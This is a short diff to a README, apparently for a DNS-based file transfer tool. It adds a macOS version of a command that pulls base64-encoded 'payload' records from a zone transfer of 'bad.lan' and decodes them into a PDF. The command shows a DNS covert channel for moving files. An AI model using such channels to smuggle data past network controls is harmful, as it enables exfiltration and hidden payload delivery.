@@ -101,6 +101,9 @@ Where 'to put' a file is to copy towards and 'to get' a file is to copy from oth
 	* Test this on a live DNS server from your favorite Linux box:
 		> host -t axfr bad.lan ns.rains.io |grep payload | sort -n| cut -f2 -d"-"| cut -f1 -d"."|/bin/base64 -d |/bin/base64 -d > output.pdf
 
+	* Alternatively test on OSX:
+		> host -t axfr bad.lan ns.rains.io |grep payload | sort -n| cut -f2 -d"-"| cut -f1 -d"."|/usr/bin/base64 -D -i - -o - |/usr/bin/base64 -D -i - -o - > output.pdf
+
 ---
 
 
